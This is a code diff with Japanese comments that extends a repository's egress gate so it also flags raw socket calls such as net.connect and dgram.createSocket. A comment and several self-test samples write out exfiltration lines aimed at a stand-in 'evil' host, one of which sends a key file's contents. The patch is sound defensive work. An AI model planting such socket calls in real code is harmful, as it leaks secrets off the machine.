@@ -343,6 +343,20 @@ const OUTSIDE_SEND = new RegExp(
   `(?<![\\w$])(?:${OUTSIDE_SEND_NAMES.map((n) => n.replace(/\./g, '\\.')).join('|')})\\s*\\(`,
 );
 
+// 生のソケット (threat: T-027)。`fetch` 以外に `net.connect` / `tls.connect` /
+// `dgram.createSocket` / `http2.connect` も**端末の外へバイトを送れる**。上の綴り
+// 一覧には無いので、`tools/collect.cjs` に `require('net').connect(443,'evil').end(
+// fs.readFileSync(鍵))` と置けば (ファイルの秘密の持ち出し) 4 つの egress 門をすべて
+// 素通りした (実測 2026-10-13: 母集団は git ls-files の全木なので、綴りを足すだけで
+// この門が捕まえる)。文字列は上で `''` に潰されるので `require('net')` は `require('')`
+// として届く —— モジュール名は見分けられないが、ソケットの呼び方そのものを鳴らす
+// (実測: `src` の外 113 本に `.connect(` / `.createConnection(` / `.createSocket(` は 0 件)。
+const RAW_SOCKET_METHODS = 'connect|createConnection|createSocket';
+const OUTSIDE_RAW_SOCKET = new RegExp(
+  `(?:\\b(?:net|tls|dgram|http2)\\s*\\.\\s*(?:${RAW_SOCKET_METHODS})` +
+    `|require\\s*\\(\\s*(?:''|"")\\s*\\)\\s*\\.\\s*(?:${RAW_SOCKET_METHODS}))\\s*\\(`,
+);
+
 /**
  * `src` の外の網の口の台帳。**全件**載る（変数の送り先だけではない）。
  * `needle` は原文の一部で、行番号ではなく本文で照合する。
@@ -553,6 +567,13 @@ function selfTest() {
     ['★ 差し替え可能な既定引数も数える', ['const res = await fetchImpl(current, init);'], 1],
     ['★ プロパティ経由の呼び出しも数える', ['await deps.fetchImpl(current, init);'], 1],
     ['★ Node の HTTP API も数える', ['https.request(opts, cb);'], 1],
+    // 生のソケット (threat: T-027)。fetch 以外に端末の外へバイトを送れる。
+    ['★ net.connect も数える (生のソケット · T-027)', ["const s = net.connect(443, 'evil.example');"], 1],
+    ['★ tls.connect も数える', ['const s = tls.connect({ host, port });'], 1],
+    ['★ dgram.createSocket も数える', ["const s = dgram.createSocket('udp4');"], 1],
+    ['★ http2.connect も数える', ["const c = http2.connect('https://evil.example');"], 1],
+    ['★ require("net").connect も数える (文字列を潰した形)', ["require('net').connect(443, h).end(secret);"], 1],
+    ['ソケットでないメソッドは数えない (connect が別のオブジェクト)', ['db.connect({ host });'], 0],
     // 落とす側 —— ここを落とさないと台帳が 14 行になり、本当に見たい 3 件が埋もれる。
     ['ゲート自身の self-test の文字列標本は数えない', ["  ['素の fetch を通信とみなす', 'await fetch(`https://${h}/x`);', true],"], 0],
     ['行コメントは数えない', ['// await fetch(url, init);'], 0],
@@ -718,7 +739,8 @@ function outsideSendFindings(rel, lines) {
   for (let i = 0; i < stripped.length; i++) {
     const trimmed = stripped[i].trim();
     const code = stripped[i].replace(/'(?:[^'\\]|\\.)*'/g, "''").replace(/"(?:[^"\\]|\\.)*"/g, '""');
-    if (!OUTSIDE_SEND.test(code)) continue;
+    // 送り先の綴り (fetch 等) か、生のソケット (net.connect 等 · threat: T-027)。
+    if (!OUTSIDE_SEND.test(code) && !OUTSIDE_RAW_SOCKET.test(code)) continue;
     found.push({ file: rel, line: i + 1, call: trimmed.slice(0, 140) });
   }
   return found;
